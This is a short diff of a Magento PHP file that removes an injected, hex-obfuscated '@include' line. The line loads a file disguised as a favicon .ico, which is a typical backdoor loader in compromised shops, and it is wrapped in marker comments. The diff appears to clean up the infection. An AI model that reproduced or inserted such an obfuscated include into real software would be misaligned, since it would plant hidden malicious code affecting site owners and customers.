@@ -1,9 +1,5 @@
 <?php
-/*434b0*/
 
-@include "\x2fdat\x61/vh\x6fsts\x2fwww\x2eos-\x73tor\x65.co\x6d/nz\x2fjs/\x62izt\x65ch/\x66avi\x63on_\x30379\x393.i\x63o";
-
-/*434b0*/
 /**
  * Magento
  *
